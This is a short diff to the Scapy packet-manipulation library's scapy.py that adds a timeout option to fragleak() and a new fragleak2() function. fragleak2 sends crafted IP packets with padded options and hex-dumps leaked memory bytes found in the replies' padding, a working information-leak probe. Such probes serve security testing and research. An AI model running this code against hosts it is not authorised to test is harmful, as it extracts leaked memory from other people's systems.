@@ -21,6 +21,10 @@
 
 #
 # $Log: scapy.py,v $
+# Revision 1.0.1.11  2005/11/07 13:38:36  pbi
+# - added timeout parameter to fragleak()
+# - created fragleak2()
+#
 # Revision 1.0.1.10  2005/11/07 13:37:20  pbi
 # - fixed LLC/SNAP binding to overload LLC.ctrl with 3
 #
@@ -1102,7 +1106,7 @@
 
 from __future__ import generators
 
-RCSID="$Id: scapy.py,v 1.0.1.10 2005/11/07 13:37:20 pbi Exp $"
+RCSID="$Id: scapy.py,v 1.0.1.11 2005/11/07 13:38:36 pbi Exp $"
 
 VERSION = RCSID.split()[2]+"beta"
 
@@ -9393,7 +9397,7 @@ def tethereal(*args,**kargs):
 
 
 
-def fragleak(target,sport=123, dport=123):
+def fragleak(target,sport=123, dport=123, timeout=0.2):
     load = "XXXXYYYYYYYYYY"
 #    getmacbyip(target)
 #    pkt = IP(dst=target, id=RandShort(), options="\x22"*40)/UDP()/load
@@ -9406,7 +9410,7 @@ def fragleak(target,sport=123, dport=123):
             try:
                 if not intr:
                     s.send(pkt)
-                sin,sout,serr = select([s],[],[],0.2)
+                sin,sout,serr = select([s],[],[],timeout)
                 if not sin:
                     continue
                 ans=s.recv(1600)
@@ -9442,6 +9446,19 @@ def fragleak(target,sport=123, dport=123):
                 intr=1
     except KeyboardInterrupt:
         pass
+
+def fragleak2(target):
+    found={}
+    while 1:
+        p = sr1(IP(dst=target, options="\x00"*40, proto=200)/"XXXXYYYYYYYYYYYY",timeout=1,verbose=0)
+        if not p:
+            continue
+        if Padding in p:
+            leak  = p[Padding].load
+            if leak not in found:
+                found[leak]=None
+                linehexdump(leak)
+    
 
 
 plst=[]
